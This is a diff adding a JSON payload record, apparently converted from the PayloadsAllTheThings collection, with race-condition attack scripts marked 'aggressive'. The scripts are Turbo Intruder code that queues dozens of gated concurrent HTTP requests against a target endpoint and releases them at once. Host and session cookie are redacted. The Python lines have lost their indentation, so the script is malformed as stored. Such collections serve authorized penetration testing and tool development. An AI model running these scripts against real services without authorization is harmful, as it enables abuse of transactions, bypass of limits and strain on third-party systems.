@@ -1,0 +1,47 @@
+{
+  "source": "PayloadsAllTheThings",
+  "exploit_type": "race_condition",
+  "original_category": "Race Condition",
+  "payloads": [
+    {
+      "category": "HTTP/1.1 Last-byte Synchronization",
+      "escalation": "aggressive",
+      "lines": [
+        "engine.queue(request, gate='race1')",
+        "engine.queue(request, gate='race1')",
+        "engine.openGate('race1')"
+      ]
+    },
+    {
+      "category": "Example 2",
+      "escalation": "aggressive",
+      "lines": [
+        "def queueRequests(target, wordlists):",
+        "engine = RequestEngine(endpoint=target.endpoint,",
+        "concurrentConnections=30,",
+        "requestsPerConnection=100,",
+        "pipeline=False",
+        ")",
+        "request1 = '''",
+        "POST /target-URI-1 HTTP/1.1",
+        "Host: <REDACTED>",
+        "Cookie: session=<REDACTED>",
+        "parameterName=parameterValue",
+        "'''",
+        "request2 = '''",
+        "GET /target-URI-2 HTTP/1.1",
+        "Host: <REDACTED>",
+        "Cookie: session=<REDACTED>",
+        "'''",
+        "engine.queue(request1, gate='race1')",
+        "for i in range(30):",
+        "engine.queue(request2, gate='race1')",
+        "engine.openGate('race1')",
+        "engine.complete(timeout=60)",
+        "def handleResponse(req, interesting):",
+        "table.add(req)"
+      ]
+    }
+  ],
+  "converted_at": "2026-04-03T07:48:28.873Z"
+}
